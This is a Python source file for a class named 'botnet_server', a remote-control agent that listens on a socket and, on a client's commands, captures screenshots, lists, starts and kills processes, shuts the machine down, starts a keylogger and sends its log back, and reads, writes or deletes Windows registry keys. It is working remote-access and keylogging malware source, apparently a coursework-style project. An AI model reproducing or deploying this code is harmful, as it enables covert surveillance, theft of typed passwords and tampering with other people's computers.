import socket
import pyautogui
import io
import os
import signal
import subprocess
from registry import registry

class botnet_server:
#-------------------PRIVATE AREA-------------------
    HOST = '127.0.0.1'  # The default server's hostname or IP address
    PORT = 26101  # The default port used by the server
    BUF_SIZE = 256
    def __init__(self, host = HOST, port = PORT):
        self.host = host # server host IP
        self.port = port # server port
        # create new socket to listen
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.keylogger = None
    
    def __del__(self):
        if (self.nr != None):
            self.nr.close()
            self.nw.close()
            self.conn.close()
            self.nr = None
    
    # parse output of powershell for easier to handle
    def __parse(self, line):
        tokens = [elem for elem in line.split(' ') if len(elem) > 0]
        res = []
        res.append(' '.join(tokens[:-2])) # process name
        res.append(tokens[-2]) # process id
        res.append(tokens[-1]) # thread count
        return res
    
    # check if process at pid is application (has GUI)
    def __isApp(self, pid):
        data = subprocess.check_output("powershell gps | where {$_.MainWindowTitle} | select Id")
        apps = str(data).split("\\r\\n")[3:-3]
        if (pid not in apps): 
            raise Exception
            
    def __get_msg(self):
        data = self.nr.readline()
        return data.strip()
    
    def __exec_cmd(self, cmd):
        try:
            eval(cmd)
            print("Executed", cmd, "successfully!")
            self.conn.send(b"1")
        except:
            print("Failed to execute", cmd + "!")
            self.conn.send(b"0")
    
    def __recv(self):
        size = int(self.nr.readline().strip())
        chunks = []
        while size > 0:
            chunk = self.conn.recv(min(size, BUF_SIZE))
            if chunk == b'':
                raise RuntimeError("socket connection broken")
            chunks.append(chunk)
            size -= len(chunk)
        return b''.join(chunks)
    
    def __send(self, data):
        self.nw.write(str(len(data)) + '\n'); self.nw.flush()
        self.conn.sendall(data)   
            
#-------------------PUBLIC AREA-------------------
    def listen_and_accept(self):
        self.s.bind((self.host, self.port))
        print('Bind at IP:', self.host, 'port', self.port)
        self.s.listen()
        self.conn, self.addr = self.s.accept() # connection socket
        self.nr = self.conn.makefile(mode = 'r', encoding = 'utf-8') # stream reader
        self.nw = self.conn.makefile(mode = 'w', encoding = 'utf-8') # stream writer
        self.s.close()
        print('Connected by', self.addr)
    
    def close_connect(self):
        if (self.nr != None):
            self.nr.close()
            self.nw.close()
            self.conn.close()
            self.nr = None
    
    def response_msg(self):
        query = self.__get_msg()
        print(query)
        cmd = ''
        if (query == 'QUIT'):
            self.close_connect()
        if (query == 'PIC'):
            cmd = "self.send_screenshot()"
        elif (query == 'PROC'):
            cmd = "self.send_list_process()"
        elif (query == 'KILLPROC'):
            cmd = "self.kill_process()"
        elif (query == 'STARTPROC'):
            cmd = "self.start_process()"
        elif (query == 'APP'):
            cmd = "self.send_list_app()"
        elif (query == 'KILLAPP'):
            cmd = "self.kill_app()"
        elif (query == 'STARTAPP'):
            cmd = "self.start_app()"
        elif (query == 'SHUTDOWN'):
            cmd = "self.shutdown()"
        elif (query == 'HOOK'):
            cmd = "self.hook_key()"
        elif (query == 'UNHOOK'):
            cmd = "self.unhook_key()"
        elif (query == 'KEYLOG'):
            cmd = "self.send_key_log()"
        elif (query == "REGFILE"):
            cmd = "self.get_reg_text()"
        elif (query == "REGCMD"):
            cmd = "self.exec_reg_cmd()"
        if (cmd != ''):
            self.__exec_cmd(cmd)
        return (cmd != '')
    
    
    # send screenshot to client
    def send_screenshot(self):
        # take screenshot
        pic = pyautogui.screenshot()
        fd = io.BytesIO()
        pic.save(fd, "png")
        
        # send data
        data = fd.getvalue()
        self.__send(data)
    
    # send list of process to client
    def send_list_process(self):
        # get list of process
        cmd = "powershell gps | select Name,Id,@{Name='ThreadCount';Expression={$_.Threads.Count}}"
        data = subprocess.check_output(cmd)
        procs = str(data).split("\\r\\n")[3:-3]
        
        # send number of process
        size = len(procs)
        self.nw.write(str(size) + '\n'); self.nw.flush()
        
        # send list of process
        for proc in procs:
            data = self.__parse(proc)
            for elem in data:
                self.nw.write(str(elem) + '\n'); self.nw.flush()
    
    # kill process by pid
    def kill_process(self):
        pid = self.nr.readline().strip()
        os.kill(int(pid), signal.SIGTERM)
    
    # start process by name
    def start_process(self):
        proc = self.nr.readline().strip() + '.exe'
        subprocess.Popen(proc)
    
    # get list application
    def send_list_app(self):
        # get list of process
        cmd = "powershell gps | where {$_.MainWindowTitle} | select Name,Id,@{Name='ThreadCount';Expression={$_.Threads.Count}}"
        data = subprocess.check_output(cmd)
        procs = str(data).split("\\r\\n")[3:-3]

        # send number of process
        size = len(procs)
        self.nw.write(str(size) + '\n'); self.nw.flush()

        # send list of process
        for proc in procs:
            data = self.__parse(proc)
            for elem in data:
                self.nw.write(str(elem) + '\n'); self.nw.flush()
        
    # kill application by pid
    def kill_app(self):
        pid = self.nr.readline().strip()
        # check if received pid is application
        self.__isApp(pid)
        # terminate application
        os.kill(int(pid), signal.SIGTERM)
    
    # start application by name
    def start_app(self):
        app = self.nr.readline().strip() + '.exe'
        subprocess.Popen(app)
            
    # shut down server
    def shutdown(self):
        subprocess.Popen("shutdown /s")
    
    # start hook key
    def hook_key(self):
        if (self.keylogger == None):
            self.keylogger = subprocess.Popen(["python", "keylog.py"])

     
    # end hook key
    def unhook_key(self):
        self.keylogger.kill()
        self.keylogger = None
    
    # send key log to client
    def send_key_log(self):
        data = open("keylog.txt", "rb").read()
        self.__send(data)
           
    # execute registry file from client
    def get_reg_text(self):
        self.conn.sendall(b"1")
        data = self.__recv()
        with open("abc.reg", "wb") as f:
            f.write(data)
        subprocess.run(["regedit.exe", "/s", "abc.reg"])
           
    # execute registry command from client
    def exec_reg_cmd(self):
        cmd = self.nr.readline().strip()
        path = self.nr.readline().strip()
        val_name = self.nr.readline().strip()
        val = self.nr.readline().strip()
        val_type = self.nr.readline().strip()
        print(cmd, path, val_name, val_type, val)
        key = registry(path)
        if (cmd == "GETVAL"):
            ok = True
            try:
                data = bytes(key.get_value(val_name), encoding = 'utf-8')
            except:
                data = b'junk'
                ok = False
            finally:
                self.__send(data)
                if (not ok):
                    raise RuntimeError
        elif (cmd == "SETVAL"):
            key.set_value(val_name, val_type, val)
        elif (cmd == "DELVAL"):
            key.delete_value(val_name)
        elif (cmd == "CREKEY"):
            key.create_key(val_name)
        elif (cmd == "DELKEY"):
            key.delete_key("")
        else:
            raise RuntimeError
            
'''sv = botnet_server()
sv.listen_and_accept()
while True:
    t = sv.response_msg()
    if not t:
        break'''